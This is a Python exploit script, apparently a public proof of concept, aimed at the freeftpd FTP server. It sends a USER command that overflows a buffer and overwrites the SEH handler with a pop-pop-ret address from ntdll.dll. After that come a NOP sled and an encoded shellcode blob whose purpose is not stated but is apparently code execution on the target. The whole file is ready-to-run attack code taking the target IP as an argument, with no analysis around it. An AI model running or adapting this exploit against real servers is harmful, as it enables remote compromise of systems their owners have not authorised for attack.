#!/usr/bin/python 
import os,sys,time,socket

#---------------------------------------------------------------------------#
# 				Name:	Rio Atmadja			    #
# 			      Script: 	freeftpd exploit		    #
#---------------------------------------------------------------------------#

if len(sys.argv) != 2:
	print "[*] Usage: %s <ip_address> \n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]

shellcode = ("\xbf\xc0\xcb\xa5\xea\xdb\xd6\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x4f\x31\x78\x14\x03\x78\x14\x83\xc0\x04\x22\x3e\x59\x02\x2b"
"\xc1\xa2\xd3\x4b\x4b\x47\xe2\x59\x2f\x03\x57\x6d\x3b\x41\x54"
"\x06\x69\x72\xef\x6a\xa6\x75\x58\xc0\x90\xb8\x59\xe5\x1c\x16"
"\x99\x64\xe1\x65\xce\x46\xd8\xa5\x03\x87\x1d\xdb\xec\xd5\xf6"
"\x97\x5f\xc9\x73\xe5\x63\xe8\x53\x61\xdb\x92\xd6\xb6\xa8\x28"
"\xd8\xe6\x01\x27\x92\x1e\x29\x6f\x03\x1e\xfe\x6c\x7f\x69\x8b"
"\x46\x0b\x68\x5d\x97\xf4\x5a\xa1\x7b\xcb\x52\x2c\x82\x0b\x54"
"\xcf\xf1\x67\xa6\x72\x01\xbc\xd4\xa8\x84\x21\x7e\x3a\x3e\x82"
"\x7e\xef\xd8\x41\x8c\x44\xaf\x0e\x91\x5b\x7c\x25\xad\xd0\x83"
"\xea\x27\xa2\xa7\x2e\x63\x70\xc6\x77\xc9\xd7\xf7\x68\xb5\x88"
"\x5d\xe2\x54\xdc\xe7\xa9\x30\x11\xd5\x51\xc1\x3d\x6e\x21\xf3"
"\xe2\xc4\xad\xbf\x6b\xc2\x2a\xbf\x41\xb2\xa5\x3e\x6a\xc2\xec"
"\x84\x3e\x92\x86\x2d\x3f\x79\x57\xd1\xea\x2d\x07\x7d\x45\x8d"
"\xf7\x3d\x35\x65\x12\xb2\x6a\x95\x1d\x18\x1d\x92\x8a\x63\xb6"
"\x16\x4a\x0c\xc5\x26\x4d\x77\x40\xc0\x27\x97\x05\x5b\xd0\x0e"
"\x0c\x17\x41\xce\x9a\xbf\xe2\x5d\x41\x3f\x6c\x7e\xde\x68\x39"
"\xb0\x17\xfc\xd7\xeb\x81\xe2\x25\x6d\xe9\xa6\xf1\x4e\xf4\x27"
"\x77\xea\xd2\x37\x41\xf3\x5e\x63\x1d\xa2\x08\xdd\xdb\x1c\xfb"
"\xb7\xb5\xf3\x55\x5f\x43\x38\x66\x19\x4c\x15\x10\xc5\xfd\xc0"
"\x65\xfa\x32\x85\x61\x83\x2e\x35\x8d\x5e\xeb\x45\xc4\xc2\x5a"
"\xce\x81\x97\xde\x93\x31\x42\x1c\xaa\xb1\x66\xdd\x49\xa9\x03"
"\xd8\x16\x6d\xf8\x90\x07\x18\xfe\x07\x27\x09")

nseh = "\xeb\x09\x90\x90" 
seh = "\x67\x9b\xfb\x77" # 0x77fb9b67 : pop ebx # pop esi # ret ( C:\WINNT\system32\ntdll.dll )
password = "123qwe"
username = '\x41' * 1004 + nseh + seh + '\x90' * 16 + shellcode + '\x43' * 350

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d " % (target,21)
try:
	s.connect((target,21))

except:
	print "[-] Could not connect to " + target + ":21\r"
	sys.exit(0)

s.send("user %s\r\n" %username)
s.recv(1024)
s.send("pass %s\r\n" %password)
s.recv(1024)
print "[+] Sending payload of size " + str(len(username)) + " Bytes"
s.close()
print "[+] Exploit Sent Sucessfully" 





